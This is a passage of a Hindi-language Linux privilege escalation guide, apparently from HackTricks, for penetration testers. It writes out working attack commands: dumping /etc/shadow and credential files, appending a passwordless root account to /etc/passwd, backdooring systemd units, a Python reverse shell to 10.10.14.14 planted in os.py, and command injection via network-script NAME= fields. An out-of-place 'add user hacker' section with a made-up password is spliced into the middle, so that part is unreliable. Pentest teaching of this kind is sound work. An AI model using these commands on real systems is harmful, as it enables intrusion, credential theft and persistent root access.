OS के अनुसार `/etc/passwd` और `/etc/shadow` फ़ाइलें अलग नाम से हो सकती हैं या उनका बैकअप मौजूद हो सकता है। इसलिए सलाह दी जाती है कि **सभी को खोजें** और **जांचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि यह देखा जा सके कि **क्या फ़ाइलों के अंदर hashes हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ अवसरों पर आप `/etc/passwd` (या समकक्ष) फ़ाइल के भीतर **password hashes** पा सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

पहले, निम्नलिखित में से किसी एक कमांड से password जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
# Privilege Escalation

यह फ़ाइल Privilege Escalation से संबंधित नोट्स और तकनीकों का संग्रह है। इसमें उन तरीकों और उपकरणों का विवरण है जिनका उपयोग सिस्टम में ऊँची पहुंच प्राप्त करने के लिए किया जा सकता है। पढ़ते समय सावधानी रखें और केवल वैध परीक्षण परिवेश में ही इन तकनीकों का उपयोग करें।

## Add user `hacker` and set generated password

user `hacker` जोड़ने और उसके लिए जेनरेट किया गया पासवर्ड सेट करने के लिए नीचे दिए गए कमांड का उपयोग करें:

```bash
# Create the user with a home directory
sudo useradd -m hacker

# Set the generated password for the user
echo 'hacker:7d^K9sL#vQ2zM1p!' | sudo chpasswd
```

Generated password:
```
7d^K9sL#vQ2zM1p!
```

सुनिश्चित करें कि आप यह पासवर्ड सुरक्षित स्थान पर संग्रहीत करें और उत्पादन (production) वातावरण में उपयोग करने से पहले पासवर्ड नीति और सुरक्षा आवश्यकताओं के अनुसार बदलें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

आप अब `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप पासवर्ड के बिना एक डमी उपयोगकर्ता जोड़ने के लिए निम्न पंक्तियों का उपयोग कर सकते हैं.\  
चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको यह जांचना चाहिए कि क्या आप कुछ **संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर एक **tomcat** सर्वर चल रहा है और आप **Tomcat service configuration file को /etc/systemd/ के अंदर संशोधित कर सकते हैं,** तो आप इन पंक्तियों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat शुरू होने पर निष्पादित होगा।

### फ़ोल्डरों की जाँच करें

निम्न फ़ोल्डरों में बैकअप या दिलचस्प जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी को पढ़ नहीं पाएंगे, लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी फाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड रखने वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का कोड पढ़ें, यह **कई संभावित फ़ाइलों की खोज करता है जिनमें पासवर्ड हो सकते हैं**।\
**एक और रोचक टूल** जिसका आप उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक open source application है और Windows, Linux & Mac पर लोकल कंप्यूटर में संग्रहीत कई पासवर्ड निकालने के लिए उपयोग होता है।

### लॉग्स

यदि आप लॉग्स पढ़ सकते हैं, तो आप उनमें से **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। लॉग जितना अजीब होगा, वह (शायद) उतना ही अधिक दिलचस्प होगा।\
इसके अलावा, कुछ **bad** configured (backdoored?) **audit logs** आपको audit logs के भीतर पासवर्ड रिकॉर्ड करने की अनुमति दे सकते हैं, जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**लॉग पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत मददगार होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके **नाम** में या **सामग्री** के अंदर "**password**" शब्द मौजूद हों, और साथ ही logs के अंदर IPs और emails, या hashes के लिए regexps भी चेक करें.\
मैं यहाँ ये सब कैसे करना है विस्तार से नहीं बता रहा, लेकिन अगर आप इंट्रेस्टेड हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) कौन से अंतिम checks perform करता है।

## Writable files

### Python library hijacking

अगर आप जानते हैं कि एक python script किस **स्थान** से execute होगी और आप उस फ़ोल्डर के अंदर **लिख सकते हैं** या आप **python libraries को modify** कर सकते हैं, तो आप OS library को modify करके उसे backdoor कर सकते हैं (यदि आप उस जगह लिख सकते हैं जहाँ python script execute होगी, तो os.py library को copy और paste करें)।

To **backdoor the library** बस os.py library के अंत में निम्नलिखित line जोड़ें (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate का शोषण

`logrotate` में एक कमजोरी ऐसी स्थितियों में उपयोगकर्ताओं को जिन्हें किसी log फ़ाइल या उसकी parent निर्देशिकाओं पर **write permissions** हैं संभावित रूप से escalated privileges हासिल करने देती है। ऐसा इसलिए है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, को arbitrary फाइलों को execute करने के लिए manipulate किया जा सकता है, विशेष रूप से _**/etc/bash_completion.d/**_ जैसी निर्देशिकाओं में। केवल _/var/log_ में ही नहीं बल्कि उन किसी भी निर्देशिका की permissions जाँचना महत्वपूर्ण है जहाँ log rotation लागू है।

> [!TIP]
> यह कमजोरी `logrotate` के version `3.18.0` और पुराने संस्करणों को प्रभावित करती है

इस कमजोरी के बारे में अधिक विस्तृत जानकारी इस पेज पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमजोरी को [**logrotten**](https://github.com/whotwagner/logrotten) के साथ exploit कर सकते हैं।

यह कमजोरी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** के बहुत समान है, इसलिए जब भी आप पाएँ कि आप logs बदल सकते हैं, देखें कि वे logs किस द्वारा manage किए जा रहे हैं और देखें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से एक उपयोगकर्ता _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट **write** करने में सक्षम है **या** किसी मौजूद स्क्रिप्ट को **adjust** कर सकता है, तो आपका **system is pwned**।

Network scripts, _ifcg-eth0_ उदाहरण के लिए नेटवर्क कनेक्शनों के लिए उपयोग होते हैं। वे बिल्कुल .INI फाइलों जैसे दिखते हैं। हालाँकि, उन्हें Linux पर Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` atribuute को सही तरीके से handle नहीं किया जाता है। अगर NAME में **white/blank space** है तो सिस्टम white/blank space के बाद वाले हिस्से को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद का सब कुछ root के रूप में execute किया जाता है**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें कि Network और /bin/id के बीच रिक्त स्थान है_)

### **init, init.d, systemd, और rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का स्थान है, जो **classic Linux service management system** है। इसमें सेवाओं को `start`, `stop`, `restart`,` और कभी-कभी `reload` करने वाली scripts शामिल होती हैं। इन्हें सीधे या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से चलाया जा सकता है। Redhat सिस्टम्स में वैकल्पिक पाथ `/etc/rc.d/init.d` होता है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया एक नया **service management** तरीका है और इसमें service management टास्क के लिए configuration फाइलें होती हैं। Upstart में transition के बावजूद SysVinit scripts अक्सर Upstart configurations के साथ उपयोग किए जाते हैं क्योंकि Upstart में एक compatibility layer मौजूद है।

**systemd** आधुनिक initialization और service manager के रूप में उभरा है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत फीचर्स प्रदान करता है। यह फ़ाइलों को `/usr/lib/systemd/` (distribution packages के लिए) और `/etc/systemd/system/` (administrator modifications के लिए) में व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल हो जाती है।

## अन्य ट्रिक्स

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### प्रतिबंधित Shells से बाहर निकलना (Escaping from restricted Shells)


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को userspace manager को expose करने के लिए एक syscall को hook करते हैं। कमजोर manager authentication (उदाहरण के लिए, FD-order पर आधारित signature checks या खराब password schemes) एक local app को manager की नकल करने और पहले से-rooted devices पर root तक escalate करने में सक्षम बना सकती है। अधिक जानें और exploitation विवरण यहां:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors के लिए सबसे अच्छा टूल:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## संदर्भ

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
